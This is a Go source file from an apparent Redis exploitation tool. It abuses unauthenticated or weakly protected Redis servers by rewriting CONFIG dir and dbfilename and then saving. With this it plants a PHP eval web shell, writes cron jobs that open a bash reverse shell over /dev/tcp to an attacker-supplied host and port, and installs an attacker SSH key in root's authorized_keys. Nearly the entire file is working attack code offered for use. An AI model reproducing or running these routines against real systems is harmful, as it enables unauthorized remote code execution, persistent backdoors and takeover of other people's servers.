package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"bufio"
	"context"
	"fmt"
	"github.com/go-redis/redis/v8"
	"os"
	"strconv"
	"strings"
)

var s string

func con() (*redis.Client, context.Context) {

	// 快速入门：
	// 连接、执行命令
	ctx := context.Background()
	ctx.Done()

	rdb := redis.NewClient(&redis.Options{
		Addr:     common.Host + ":" + strconv.Itoa(common.Port),
		Username: "",
		Password: common.Password,
		DB:       0,
	})
	// Redis<localhost:6379 db:0>
	return rdb, ctx

}

func Codes() {
	rdb, ctx := con()
	fmt.Println(rdb.String())
	ss := strings.Fields(common.Code)
	switch len(ss) {
	case 7:
		val2, err := rdb.Do(ctx, ss[0], ss[1], ss[2], ss[3], ss[4], ss[5], ss[6]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 6:
		val2, err := rdb.Do(ctx, ss[0], ss[1], ss[2], ss[3], ss[4], ss[5]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 5:
		val2, err := rdb.Do(ctx, ss[0], ss[1], ss[2], ss[3], ss[4]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 4:
		val2, err := rdb.Do(ctx, ss[0], ss[1], ss[2], ss[3]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 3:
		val2, err := rdb.Do(ctx, ss[0], ss[1], ss[2]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}

	case 2:
		val2, err := rdb.Do(ctx, ss[0], ss[1]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 1:
		val2, err := rdb.Do(ctx, ss[0]).Result()
		if err == redis.Nil {
			fmt.Println("command not found")
		} else {
			fmt.Println(val2)
		}
		if val2 == nil {
			return
		}
	case 0:
		return
	}
}

func Wshell() {
	rdb, ctx := con()
	// Redis<localhost:6379 db:0>
	val2 := rdb.Do(ctx, "config", "set", "dir", common.Path).String()
	fmt.Println("\n" + val2)
	if strings.Contains(val2, "OK") {
		val3 := rdb.Do(ctx, "config", "set", "dbfilename", "shell.php").String()
		fmt.Printf("\n" + val3)
		if strings.Contains(val3, "OK") {
			if common.File != "" {
				s, _ = pkg.Readfile(common.File)
				s = fmt.Sprintf("\r\n\r\n%s\r\n\r\n", common.File)
			} else {
				s = "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
			}
			val4 := rdb.Do(ctx, "set", "xxx", s).String()
			fmt.Println("\n" + val4)
			if strings.Contains(val4, "OK") {
				_, err := rdb.Do(ctx, "save").Result()
				if err != nil {
					fmt.Println("\n写入shell失败")
				}
			} else {
				fmt.Println("\n写入shell失败")
			}
		} else {
			fmt.Println("\n写入shell失败")
		}
	}
}

func ncshell() {
	ubuntu()
	censell()
}

func ubuntu() {
	rdb, ctx := con()
	exp := fmt.Sprintf("\n\n*/1 * * * * /bin/bash -i >&/dev/tcp/%v/%v 0>&1\n\n", common.Wshell, common.Wport)
	val2 := rdb.Do(ctx, "set", "xxxxxxxxxzzzzzzzzz", exp).String()
	fmt.Println(val2)
	if strings.Contains(val2, "OK") {
		val3 := rdb.Do(ctx, "config", "set", "dir", "/var/spool/cron/crontabs/").String()
		fmt.Println(val3)
		if strings.Contains(val3, "OK") {
			val4 := rdb.Do(ctx, "config", "set", "dbfilename", "root").String()
			fmt.Println(val4)
			if strings.Contains(val4, "OK") {
				_, err := rdb.Do(ctx, "save").Result()
				if err != nil {
					fmt.Println("写入计划任务失败")
				}
			}
		} else {
			fmt.Println("写入计划任务失败")
		}
	} else {
		fmt.Println("写入计划任务失败")
	}
}

func censell() {
	rdb, ctx := con()
	exp := fmt.Sprintf("\n\n* * * * * /bin/bash -i >&/dev/tcp/%v/%v 0>&1\n\n", common.Wshell, common.Wport)
	val2 := rdb.Do(ctx, "set", "xxxzzzzzzzzzzzzzzzzzzzzzzzzz", exp).String()
	fmt.Println(val2)
	if strings.Contains(val2, "OK") {
		val3 := rdb.Do(ctx, "config", "set", "dir", "/var/spool/cron/").String()
		fmt.Println(val3)
		if strings.Contains(val3, "OK") {
			val4 := rdb.Do(ctx, "config", "set", "dbfilename", "root").String()
			fmt.Println(val4)
			if strings.Contains(val4, "OK") {
				_, err := rdb.Do(ctx, "save").Result()
				if err != nil {
					fmt.Println("写入计划任务失败")
				}
			}
		} else {
			fmt.Println("写入计划任务失败")
		}
	} else {
		fmt.Println("写入计划任务失败")
	}
}

func Wkey() {
	rdb, ctx := con()
	key, err := readfile(common.Path)
	if err != nil {
		text := fmt.Sprintf("the key file %s is emty", common.Path)
		fmt.Println(text)
	}
	if len(key) == 0 {
		text := fmt.Sprintf("the keyfile %s is empty", common.Path)
		fmt.Println(text)
	}
	exp := fmt.Sprintf("\n\n%v\n\n", key)
	xx := rdb.Do(ctx, "set", "x", exp).String()
	fmt.Println(xx)
	if strings.Contains(xx, "OK") {
		xx1 := rdb.Do(ctx, "config", "set", "dir", "/root/.ssh").String()
		fmt.Println(xx1)
		if strings.Contains(xx1, "OK") {
			xx2 := rdb.Do(ctx, "config", "set", "dbfilename", "authorized_keys").String()
			fmt.Println(xx2)
			if strings.Contains(xx2, "OK") {
				xx3 := rdb.Do(ctx, "save")
				fmt.Println(xx3)
			}
		}
	}

}

func readfile(string) (string, error) {
	file, err := os.Open(common.Path)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}
